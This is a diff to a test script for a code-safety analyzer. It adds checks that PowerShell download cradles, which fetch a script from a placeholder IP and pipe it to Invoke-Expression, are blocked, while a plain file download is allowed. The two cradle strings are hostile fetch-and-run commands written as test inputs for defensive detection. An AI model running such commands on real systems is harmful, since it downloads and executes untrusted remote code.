@@ -62,6 +62,11 @@ def main():
     bom = analyze("﻿import os\nprint(os.getcwd())")
     ok &= check("leading BOM allowed, language still python", bom["verdict"] == "allow" and bom["code_language"] == "python", bom)
     ok &= check("BOM inside code still blocks", analyze("x = 1﻿\nprint(x)")["verdict"] == "block")
+    # 8. PowerShell download cradles (download, then Invoke-Expression) block; a plain download does not.
+    for code in ["iwr http://203.0.113.5/a.ps1 | iex", "Invoke-Expression (Invoke-WebRequest http://203.0.113.5/a.ps1).Content"]:
+        ok &= check(f"blocks: {code}", "dependency_risk" in analyze(code)["categories"], analyze(code))
+    ok &= check("plain Invoke-WebRequest -OutFile is allowed",
+                analyze("Invoke-WebRequest https://example.test/file.zip -OutFile file.zip")["verdict"] == "allow")
     print("\nALL PASS" if ok else "\nSOME FAILED")
     sys.exit(0 if ok else 1)
 
